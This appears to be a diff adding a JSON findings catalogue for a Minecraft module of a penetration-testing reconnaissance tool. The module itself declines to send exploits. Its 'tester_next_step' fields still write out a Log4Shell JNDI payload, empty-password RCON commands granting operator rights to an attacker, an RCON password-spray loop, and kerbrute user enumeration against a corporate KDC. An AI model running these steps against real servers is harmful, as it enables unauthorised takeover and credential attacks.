@@ -1,0 +1,104 @@
+{
+  "service": "minecraft",
+  "module_files": [
+    "recce/services/minecraft.py"
+  ],
+  "summary": "Minecraft Java Edition SLP with careful VarInt/JSON parsing. Log4Shell version-classification (T1 candidate \u2014 refuses to send JNDI). RCON companion probe on 25575 with empty-password Login (T2 \u2014 real Source-RCON handshake, request-id echo tells if accepted). MOTD FQDN + Forge mod inventory + player sample (T0/T1). Missing: crack-loop for weak RCON pw list, no active JNDI probe (correct per airgap).",
+  "findings": [
+    {
+      "kind": "minecraft_log4shell",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "Minecraft server in Log4Shell-vulnerable version range (CVE-2021-44228)",
+      "tier_evidence": "Version-only classification \u2014 deterministic based on parsed Java Edition version 1.7-1.18.0. Does not send JNDI payload (would BE the exploit).",
+      "can_promote_to": "t2",
+      "promotion_notes": "T2 promotion requires a JNDI callback probe \u2014 attacker-owned LDAP listener + ${jndi:ldap://\u2026} chat/console send. Destructive and would count as active exploit.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "# ROE-required: connect with a real MC client, send chat containing ${jndi:ldap://<controlled-host>/x}; watch controlled LDAP for JNDI lookup. On unpatched servers this is instant RCE.",
+      "related_cves": [
+        "CVE-2021-44228"
+      ]
+    },
+    {
+      "kind": "minecraft_player_roster",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "Minecraft SLP discloses player roster (usernames + UUIDs) unauthenticated",
+      "tier_evidence": "Real player sample entries returned in Status Response \u2014 deterministic, corp usernames = crown-jewel recon.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Feed usernames + UUIDs into known_users; correlate with AD sAMAccountName pattern for spray targets.",
+      "promotion_risk": "low",
+      "tester_next_step": "mcstatus IP:25565 status  # then for each username: kerbrute userenum against corp KDC"
+    },
+    {
+      "kind": "minecraft_motd_hostnames",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "Minecraft MOTD discloses internal hostnames / branding",
+      "tier_evidence": "FQDN-shaped tokens extracted from MOTD text.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feeds known_hostnames.",
+      "promotion_risk": "none",
+      "tester_next_step": "mcstatus IP:25565 status  ; resolve any FQDN tokens against internal DNS"
+    },
+    {
+      "kind": "minecraft_rcon_open",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "Minecraft RCON accepts empty password",
+      "tier_evidence": "Source-RCON Login with empty password returned AUTH_RESPONSE with the original request-id \u2014 proof the login was ACCEPTED. Not a posture claim; a real credential.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Chain: send /op <attacker>, /execute, or /stop via a real command \u2014 full server control. Currently module refuses to send any command payload.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "mcrcon -H IP -p '' -P 25575 list  ; mcrcon -H IP -p '' -P 25575 'op <attacker>' ; mcrcon -H IP -p '' -P 25575 'save-all' \u2014 ROE-required."
+    },
+    {
+      "kind": "minecraft_rcon_exposed",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "Minecraft RCON exposed on 25575/tcp",
+      "tier_evidence": "Source-RCON framing answered \u2014 posture.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Add: hydra-style spray with common weak RCON passwords (minecraft, admin, changeme).",
+      "promotion_risk": "high",
+      "tester_next_step": "for pw in '' minecraft admin changeme rcon; do mcrcon -H IP -p \"$pw\" -P 25575 list && echo HIT $pw; done"
+    },
+    {
+      "kind": "minecraft_proxy",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "BungeeCord/Velocity proxy detected",
+      "tier_evidence": "version.name fingerprint.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Backend enum needs code execution on the proxy host.",
+      "promotion_risk": "none",
+      "tester_next_step": "# from a session on the proxy host: cat /opt/bungeecord/config.yml or /opt/velocity/velocity.toml"
+    },
+    {
+      "kind": "minecraft_mods",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "Modded Minecraft server (Forge/Fabric) \u2014 mod inventory captured",
+      "tier_evidence": "forgeData/modinfo parse.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feeds a product-inventory / mod-CVE mapper.",
+      "promotion_risk": "none",
+      "tester_next_step": "mcstatus IP:25565 json  ; correlate each mod id + version against known modded-MC CVEs"
+    },
+    {
+      "kind": "minecraft_fingerprint",
+      "tier": "t0",
+      "severity": "info",
+      "title_pattern": "Minecraft server identified",
+      "tier_evidence": "Always emitted for a reachable server.",
+      "can_promote_to": "stay",
+      "promotion_notes": "n/a",
+      "promotion_risk": "none",
+      "tester_next_step": "mcstatus IP:25565 status"
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users (player sample)",
+    "known_hostnames (MOTD FQDNs)"
+  ]
+}
